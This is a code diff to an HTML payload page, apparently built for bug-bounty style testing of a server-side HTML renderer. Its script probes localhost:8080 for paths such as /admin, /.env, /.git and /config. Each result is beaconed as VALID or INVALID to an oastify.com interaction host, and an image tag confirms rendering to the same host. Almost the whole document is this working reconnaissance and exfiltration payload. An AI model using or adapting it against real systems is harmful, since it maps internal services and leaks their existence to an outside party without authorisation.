@@ -12,19 +12,22 @@
     <img src="https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?ItsRenderingHtml">
     <script>
         const paths = [
-            "/", "/robots.txt", "/login", "/admin", "/api", "/api/v1",
-            "/dashboard", "/config", "/metrics", "/status", "/.env", "/.git", "/idDontExist323277323"
+            "/", "/robots.txt", "/login", "/admin", "/api", "/dashboard",
+            "/config", "/metrics", "/.env", "/.git", "/idDontExist323277323"
         ];
 
         paths.forEach(path => {
-            fetch(`http://localhost:8080${path}`, { mode: "no-cors" })
-                .then(() => {
-                    fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com?hit=8080${btoa(path)}`);
-                })
-                .catch(() => { });
+            const img = new Image();
+            img.src = `http://localhost:8080${path}`;
+
+            img.onload = () => {
+                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=VALID-${btoa(path)}`);
+            };
+
+            img.onerror = () => {
+                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=INVALID-${btoa(path)}`);
+            };
         });
-
-
     </script>
 
 </body>
